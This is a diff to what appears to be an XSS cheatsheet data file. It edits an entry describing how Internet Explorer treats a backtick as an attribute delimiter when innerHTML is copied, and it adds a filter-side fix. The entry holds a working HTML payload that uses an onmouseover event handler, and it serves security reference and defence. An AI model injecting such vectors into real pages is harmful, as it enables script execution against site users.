@@ -1831,25 +1831,25 @@ var items =
         'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
         'reporter'   : '.mario'
     },
-    { /* ID 59 - XSS using Grove Accent letter when copying innerHTML */
+    { /* ID 59 - XSS using accent grave when copying innerHTML */
         'id'         : 59,
         'category'   : 'html', 
         'name'       : {
-            'en' : 'XSS using Grove Accent letter when copying innerHTML',
+            'en' : 'XSS using accent grave when copying innerHTML',
             'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div> <script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML; </script>',
+        'data'       : '<div id="div1"><input value="``onmouseover=%js_alert%"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
         'description': {
-			'en' : 'IE assumes Grove Accent letter (`) as quotation like as \", \'. and strip Quotation mark(") of attribute value if the value doesn\'t contain space when refering innerHTML.',
+			'en' : 'Internet Explorer treats the accent grave (`) as an attribute delimiter like \" and \'. The quotation mark (") will be stripped from the attribute value when using the innerHTML property in case it doesn\'t contain space.',
             'ja' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
             'ru' : '',
             'de' : ''
         },
         'urls'    : [],
         'howtofix'   : {
-            'en' : '',
+            'en' : 'Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja).',
             'ja' : '',
             'ru' : '',
             'de' : ''
